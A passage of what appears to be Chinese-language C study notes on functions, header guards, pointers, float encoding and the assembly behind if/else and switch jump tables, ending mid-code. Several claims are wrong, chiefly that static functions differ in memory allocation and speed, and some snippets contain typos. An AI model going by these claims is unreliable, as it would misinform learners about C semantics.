<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LENGTH 6</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[LENGTH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> length = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 添加随机数种子</span></span><br><span class="line">	srand((<span class="type">size_t</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> value = rand() % <span class="number">32</span> + <span class="number">1</span>;</span><br><span class="line">		arr[i] = value;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; length; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (value == arr[j])</span><br><span class="line">			&#123;</span><br><span class="line">				flag++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (flag != <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			i--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> blue = rand() %<span class="number">16</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;+ %d\n&quot;</span>, blue);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-函数的定义与使用"><a href="#1-函数的定义与使用" class="headerlink" title="1.函数的定义与使用"></a>1.函数的定义与使用</h4><h5 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">返回值类型 函数名(参数列表)</span><br><span class="line">&#123;</span><br><span class="line">	代码体;</span><br><span class="line">	return 返回值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义静态函数static与非静态函数，静态函数与非静态函数的<strong>区别</strong>：</p>
<ol>
<li>可见性：<strong>静态函数</strong>只能在<strong>当前文件内使用</strong>，不能被其他文件调用，而<strong>非静态函数</strong>可以被当前文件以外的其他文件调用，具有<strong>全局可见性</strong>。</li>
<li>生命周期：静态函数在程序运行期间一直存在，不会被释放，而非静态函数则是在被调用时动态地创建并在函数返回时被释放，拥有较短的生命周期。</li>
<li>内存分配：非静态函数调用时从堆栈中动态分配内存空间，函数返回时空间被释放，而静态函数分配内存空间仅一次，且在程序运行期间一直存在，调用时并不会重新分配内存空间。</li>
<li>其他：静态函数不能被其他文件调用，因此可以被认为是一种信息隐藏方法，能够有效地维护代码的安全性。同时，在一些对性能要求较高的场景，静态函数相比非静态函数性能更好，因为静态函数的调用时间更短。</li>
</ol>
<p>函数实例：判断字符串是否相等</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> ch1[] = <span class="string">&quot;hallo&quot;</span>;</span><br><span class="line">	<span class="type">char</span> ch2[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	<span class="type">int</span> value = strcompair(ch1, ch2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (value == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;两个字符串相同&quot;</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;两字符串不相同\t%d\n&quot;</span>, value);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strcompair</span><span class="params">(<span class="type">char</span> ch1[], <span class="type">char</span> ch2[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (ch1[i] == ch2[i])</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 判断是否到了字符串结尾</span></span><br><span class="line">		<span class="keyword">if</span> (ch1[i] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//没到结尾继续判断下一位</span></span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ch1[i] &gt; ch2[i] ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-函数样式"><a href="#2-函数样式" class="headerlink" title="2.函数样式"></a>2.函数样式</h4><p>1.无参函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.有参函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">function</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-函数的声明"><a href="#3-函数的声明" class="headerlink" title="3.函数的声明"></a>3.函数的声明</h4><p>如果函数定义在主函数之后，则函数需要在主函数之前声明。</p>
<h4 id="4-main函数和exit函数"><a href="#4-main函数和exit函数" class="headerlink" title="4.main函数和exit函数"></a>4.main函数和exit函数</h4><p>exit()函数：结束程序运行</p>
<p>在主函数中，main()，使用return和exit基本没有区别，都会结束程序运行</p>
<p>在函数中，使用return会返回返回值，使用exit()也会停止整个程序</p>
<p>例如：一个程序中有一个加载图片的函数，图片加载不了程序不能正常运行，则此时使用exit()函数使程序终止。</p>
<h3 id="八、多文件编程"><a href="#八、多文件编程" class="headerlink" title="八、多文件编程"></a>八、多文件编程</h3><p><strong>·</strong>可以再头文件中声明函数，在主函数中只导入头文件即可，不用一直声明函数。</p>
<img src="/2023/12/15/c/image-20231207213854267.png" alt="image-20231207213854267" style="zoom:150%;">

<p>自定义函数文件和自定义头文件可以文件名相同，可以方便捋顺程序</p>
<p>自定义的头文件中要写，防止main函数 头文件包含</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br></pre></td></tr></table></figure>

<p>如果头文件包含则会报错：</p>
<img src="/2023/12/15/c/image-20231207215038085.png" alt="image-20231207215038085" style="zoom:67%;">

<p>为了避免同一个文件被include多次，C&#x2F;C++中有两种方式，一种是#ifndef方式，一种是pragma once方式</p>
<p>#pragma once：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="comment">//声明语句</span></span><br></pre></td></tr></table></figure>

<p>#ifndef</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#indef __SOMEFILE_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __SOMEFILE_H__</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明语句</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h3 id="九、指针"><a href="#九、指针" class="headerlink" title="九、指针"></a>九、指针</h3><h4 id="1-定义指针"><a href="#1-定义指针" class="headerlink" title="1.定义指针"></a>1.定义指针</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>* p;</span><br></pre></td></tr></table></figure>

<p>定义指针时，想存储什么类型的数据就要定义什么类型的指针。</p>
<p><strong>通过指针赋值：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span>* p = &amp;a;</span><br><span class="line">	*p = <span class="number">100</span>; </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>运算符</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>取值运算符</td>
</tr>
<tr>
<td>&amp;</td>
<td>取地址运算符</td>
</tr>
</tbody></table>
<p>可以通过 &amp;a 取出 a 的地址赋值给指针p，也可以通过 * p 取出指针p所指向的变量存储的值 </p>
<p>指针所占内存大小：</p>
<img src="/2023/12/15/c/image-20231207224226442.png" alt="image-20231207224226442" style="zoom: 67%;">

<img src="/2023/12/15/c/image-20231207224336967.png" alt="image-20231207224336967" style="zoom:67%;">

<p>​                                    <strong>在32位操作系统中，指针大小为4字节</strong>                                          <strong>在64位操作系统中，指针大小为8字节</strong></p>
<h4 id="2-野指针和空指针"><a href="#2-野指针和空指针" class="headerlink" title="2.野指针和空指针"></a>2.野指针和空指针</h4><h5 id="野指针"><a href="#野指针" class="headerlink" title="野指针"></a>野指针</h5><img src="/2023/12/15/c/image-20231207230337071.png" alt="image-20231207230337071" style="zoom:67%;">

<p>所以，存在野指针不会出现错误，但是操作或访问野指针时可能会出错。</p>
<p>不建议把一个变量的值直接赋值给指针。</p>
<h5 id="空指针"><a href="#空指针" class="headerlink" title="空指针"></a>空指针</h5><p> 空指针是指内存地址编号为0的空间</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>* p = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>空指针也不能访问或操作</p>
<p><strong>应用：</strong>空指针可以用作条件判断</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (p==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="万能指针-void"><a href="#万能指针-void" class="headerlink" title="万能指针 void*"></a>万能指针 void*</h5><p><strong>所占字节大小</strong></p>
<p>在32为操作系统下占4个字节，在64为操作系统下占8个字节</p>
<p>万能指针可以接受任意类型变量的内存地址</p>
<p>但是通过万能指针操作（访问、修改）所指变量时，必须找到变量对应的指针类型，如：</p>
<img src="/2023/12/15/c/image-20231207232205725.png" alt="image-20231207232205725" style="zoom:67%;">

<p>必须将指针p强制转换为int类型指针：</p>
<img src="/2023/12/15/c/image-20231207232316993.png" alt="image-20231207232316993" style="zoom:67%;">

<h5 id="const修饰的指针类型"><a href="#const修饰的指针类型" class="headerlink" title="const修饰的指针类型"></a>const修饰的指针类型</h5><img src="/2023/12/15/c/image-20231207233230201.png" alt="image-20231207233230201" style="zoom:67%;">
通过指针修改了const修饰的常量



<h6 id="1-const修饰指针类型"><a href="#1-const修饰指针类型" class="headerlink" title="1.const修饰指针类型"></a>1.const修饰指针类型</h6><p>可以修改指针变量的值，不可以修改指针指向内存空进的值。（const离谁近就不能改谁</p>
<h6 id="2-const修饰指针变量"><a href="#2-const修饰指针变量" class="headerlink" title="2.const修饰指针变量"></a>2.const修饰指针变量</h6><p>可以修改指针指向内存空间的值</p>
<h6 id="3-const同时修饰指针类型和指针变量（只读指针）"><a href="#3-const同时修饰指针类型和指针变量（只读指针）" class="headerlink" title="3.const同时修饰指针类型和指针变量（只读指针）"></a>3.const同时修饰指针类型和指针变量（只读指针）</h6><p>当const同时修饰指针类型和指针变量时，可以使用二级指针对一级指针所指的变量进行修改。</p>
<img src="/2023/12/15/c/image-20231207235602859.png" alt="image-20231207235602859" style="zoom:67%;">

<h4 id="3-指针与数组"><a href="#3-指针与数组" class="headerlink" title="3.指针与数组"></a>3.指针与数组</h4><p>指针与数组（p与arr）的区别：</p>
<img src="/2023/12/15/c/image-20231208091528010.png" alt="image-20231208091528010" style="zoom:67%;">

<p>数组arr所指的地址不仅有地址，还包含数组的长度，使用指针p接收arr的地址，p只是一个指针变量，不具有整个数组的长度。</p>
<p><strong>当数组作为函数参数会退化为指针。</strong>变成指针后，一个指针变量的大小为4字节(32位)，丢失了数组的元素个数</p>
<img src="/2023/12/15/c/image-20231208092320722.png" alt="image-20231208092320722" style="zoom: 67%;">

<h4 id="4-指针的加减运算"><a href="#4-指针的加减运算" class="headerlink" title="4.指针的加减运算"></a>4.指针的加减运算</h4><h5 id="1-加法运算"><a href="#1-加法运算" class="headerlink" title="1.加法运算"></a>1.加法运算</h5><p>指针计算不是简单得整数相加，</p>
<p>如果是一个int *，+1的结果是增加一个int的大小；</p>
<p>如果是一个char*，+1的结果是增加一个char大小。</p>
<p><strong>通过指针运算，计算字符串长度。</strong></p>
<img src="/2023/12/15/c/image-20231208094010583.png" alt="image-20231208094010583" style="zoom:67%;">

<p><strong>复制字符串</strong></p>
<img src="/2023/12/15/c/image-20231208095300785.png" alt="image-20231208095300785" style="zoom:67%;">

<h5 id="2-减法运算"><a href="#2-减法运算" class="headerlink" title="2.减法运算"></a>2.减法运算</h5><h2 id="C-汇编"><a href="#C-汇编" class="headerlink" title="C 汇编"></a>C 汇编</h2><h3 id="1-参数与返回值"><a href="#1-参数与返回值" class="headerlink" title="1.参数与返回值"></a>1.参数与返回值</h3><h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">返回类型 函数名（参数列表）</span><br><span class="line">&#123;</span><br><span class="line">	return；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回类型和参数列表的参数类型，如int(4byte), short(2byte),char(1byte)等用来说明数据宽度是多大</p>
<h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><img src="/2023/12/15/c/image-20231228141753125.png" alt="image-20231228141753125" style="zoom:67%;">

<img src="/2023/12/15/c/image-20231228141919911.png" alt="image-20231228141919911" style="zoom:67%;">

<p>函数返回后使用eax存储，函数ret后，eax存储的返回值被压到堆栈中。</p>
<h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2.变量"></a>2.变量</h3><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	x = <span class="number">123456</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1)编译的时候就已经确定了内存地址和宽度，变量名就是内存地址的别名。</p>
<p>2)如果不重写编译，全局变量的内存地址不变。游戏外挂中的找“基址”，其实就是找全局变量。</p>
<p>3)全局变量中的值任何程序都可以改，是公用的。</p>
<h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> x = <span class="number">123456</span>;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	funtion();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1)局部变量是函数内部申请的，如果函数没有执行，那么局部变量没有内存空间。</p>
<p>2)局部变量的内存是在堆栈中分配的，程序执行时才分配。我们无法预知程序何时执行，这也就意味着，我们无法确定局部变量的内存地址。</p>
<p>3)因为局部变量地址内存是不确定的，所以，局部变量只能在函数内部使用，其他函数不能使用。</p>
<h4 id="函数调用的内存布局"><a href="#函数调用的内存布局" class="headerlink" title="函数调用的内存布局"></a>函数调用的内存布局</h4><img src="/2023/12/15/c/image-20231228202155115.png" alt="image-20231228202155115" style="zoom: 50%;">

<h4 id="函数嵌套调用的内存布局"><a href="#函数嵌套调用的内存布局" class="headerlink" title="函数嵌套调用的内存布局"></a>函数嵌套调用的内存布局</h4><h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><h4 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h4><h5 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h5><p>整数类型的宽度：char short int long</p>
<p>char	8BIT	1字节<br>short	16BIT	2字节<br>int		32BIT	4字节<br>long	32BIT	4字节</p>
<h5 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h5><p>浮点类型的存储格式：float和double在存储方式上都是遵从IEEE编码规范的</p>
<p><img src="/2023/12/15/c/image-20240102144902818.png" alt="image-20240102144902818"></p>
<p><strong>8.25转成浮点存储：整数部分</strong></p>
<p>整数部分8转成2进制<br>8&#x2F;2 &#x3D; 4			0<br>4&#x2F;2 &#x3D; 2			0<br>2&#x2F;2 &#x3D; 1			0<br>1&#x2F;2 &#x3D; 0			1<br>从下往上读，所以8转成2进制是1000</p>
<p><strong>9转2进制：</strong><br>9&#x2F;2 &#x3D; 4			1<br>4&#x2F;2 &#x3D; 2			0<br>2&#x2F;2 &#x3D; 1			0<br>1&#x2F;2 &#x3D; 0			1<br>所以9转2进制是1001</p>
<p>所以，所有的整数部分一定能转成2进制</p>
<p><strong>8.25转2进制：小数部分</strong></p>
<p>小数部分转2进制用乘法</p>
<p>0.25转2进制：<br>0.25 * 2 &#x3D; 0.5		0<br>0.5 * 2 &#x3D; 1.0		1</p>
<p>当小数部分乘出0时停止<br>从上往下读：0.25转成2进制是01</p>
<p><strong>如小数部分0.4转成2进制：</strong><br>0.4 * 2 &#x3D; 0.8		0<br>0.8 * 2 &#x3D; 1.6		1<br>0.6 * 2 &#x3D; 1.2		1<br>0.2 * 2 &#x3D; 0.4		0<br>……</p>
<p>会发现当0.4转成2进制的时候，小数部分永远得不到0，所以用二进制描述小数，不可能做到完全精确</p>
<p><strong>使用IEEE规则存储小数8.25 -&gt; 1000.01 -&gt; 1.00001 * 2(10)^3</strong></p>
<p>第一位是符号位，整数填0负数填1<br>尾数部分00001从前往后填，float类型尾数23位，所以尾数是00001000000000000000000<br>指数部分：当使用科学计数法时，小数点向左移，指数的最高位填1，向右移时填0</p>
<p>因为是3次方，所以3-1&#x3D;2，将2转换为2进制，2 &#x3D;&gt; 10</p>
<p>所以指数最后填10</p>
<p>所以8.25的2进制存储格式为 0 10000010 00001000000000000000000</p>
<p>这个数用16进制表示为 -&gt; 0x41040000</p>
<p><img src="/2023/12/15/c/image-20240102153351929.png" alt="image-20240102153351929"></p>
<h3 id="if-if…else"><a href="#if-if…else" class="headerlink" title="if, if…else"></a>if, if…else</h3><p>if语句在编译器编译后，汇编语句比较灵活</p>
<p><img src="/2023/12/15/c/image-20240104195701535.png" alt="image-20240104195701535"></p>
<p><img src="/2023/12/15/c/image-20240104200120721.png" alt="image-20240104200120721"></p>
<p>当条件为a &gt; b时，汇编指令实际上做的是判断a &lt;&#x3D; b：当a &gt; b时，JLE指令不执行，直接按步执行；当a &lt;&#x3D; b时，执行JLE指令，跳过if中的执行语句。</p>
<p>当条件较简单时，编译器也会将汇编编译成TEST。</p>
<h4 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h4><p><img src="/2023/12/15/c/image-20240104200606048.png" alt="image-20240104200606048"></p>
<p>当if中判断不满足条件时，会跳转到else语句内部，当满足条件时，汇编语句会按步向下执行，在else上面的JMP跳过else的执行语句。</p>
<p>所以当判断语句是if…else时，一般中间会有一个JMP指令，用来跳过else执行语句。</p>
<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><h4 id="一般的switch"><a href="#一般的switch" class="headerlink" title="一般的switch"></a>一般的switch</h4><p>一般来说，使用switch分支语句比if的执行效率要高。</p>
<img src="/2023/12/15/c/image-20240104230139273.png" alt="image-20240104230139273" style="zoom:50%;">

<img src="/2023/12/15/c/image-20240104230208618.png" alt="image-20240104230208618" style="zoom:50%;">

<p>当情况较少时，使用if和switch的分支语句的执行效率差不多</p>
<p>但当情况较多时，使用switch的执行效率较高：</p>
<img src="/2023/12/15/c/image-20240104230606347.png" alt="image-20240104230606347" style="zoom: 67%;">

<p>发现switch的跳转语句只有上面一点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00FA18A8	 8B 45 F8             	mov         eax,dword ptr [a]  </span><br><span class="line">00FA18AB	 89 85 30 FF FF FF    	mov         dword ptr [ebp-0D0h],eax  </span><br><span class="line">00FA18B1	 8B 8D 30 FF FF FF    	mov         ecx,dword ptr [ebp-0D0h]  </span><br><span class="line">00FA18B7	 83 E9 01             	sub         ecx,1  </span><br><span class="line">00FA18BA	 89 8D 30 FF FF FF    	mov         dword ptr [ebp-0D0h],ecx  </span><br><span class="line">00FA18C0	 83 BD 30 FF FF FF 05 	cmp         dword ptr [ebp-0D0h],5  </span><br><span class="line">00FA18C7	 77 67                	ja          $LN15+0Fh (0FA1930h)  </span><br><span class="line">00FA18C9	 8B 95 30 FF FF FF    	mov         edx,dword ptr [ebp-0D0h]  </span><br><span class="line">00FA18CF	 FF 24 95 54 19 FA 00 	jmp         dword ptr [edx*4+0FA1954h]  </span><br></pre></td></tr></table></figure>

<p>switch语句在程序启动时已经在内存中生成了一个“跳转表”，在上面的这段汇编指令中，这个跳转表的地址就是从最后一句的0x0FA1954开始的，所以转到内存中查看这个内存地址：</p>
<img src="/2023/12/15/c/image-20240104231216347.png" alt="image-20240104231216347" style="zoom:50%;">

<img src="/2023/12/15/c/image-20240104231939317.png" alt="image-20240104231939317" style="zoom: 50%;">

<p>在内存地址中刚好存了这一段跳转表。</p>
<p>当跳转时，先有一句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00FA18B7	 83 E9 01             	sub         ecx,1</span><br></pre></td></tr></table></figure>

<p>这里减的是switch中最小的那个数，因为原码中写的switch条件是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">switch</span> (a)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1111\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2222\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3333\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;4444\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;5555\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;6666\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;default\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以最后减完的值会放到EDX中，使用EDX偏移计算要跳转的地址</p>
<p>switch运行速度快的第一点是：判断switch_on与最大的值的大小，当switch_on的值比最大的case还要大时，直接跳出switch</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00FA18C0	 83 BD 30 FF FF FF 05 	cmp         dword ptr [ebp-0D0h],5  </span><br><span class="line">00FA18C7	 77 67                	ja          $LN15+0Fh (0FA1930h)  </span><br></pre></td></tr></table></figure>

<p>计算完SUB之后，将计算完的值存到EDX寄存器，然后根据EDX计算跳转地址偏移。</p>
<h4 id="当switch之中的值不是连续的"><a href="#当switch之中的值不是连续的" class="headerlink" title="当switch之中的值不是连续的"></a>当switch之中的值不是连续的</h4><p><img src="/2023/12/15/c/image-20240104233957452.png" alt="image-20240104233957452"></p>
<p>c原码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">switch</span> (a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1111\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2222\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3333\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;4444\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;5555\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;6666\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;default\n&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="当case的值没有规律时"><a href="#当case的值没有规律时" class="headerlink" title="当case的值没有规律时"></a>当case的值没有规律时</h4><p>当case的值不连续且没有啥规律时，再多的case也可能跟if一样，每一个跳转都会有一个JMP</p>
<p>当原码是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (a)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1111\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2222\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3333\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">998</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;4444\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">999</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;5555\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1000</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;6666\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span 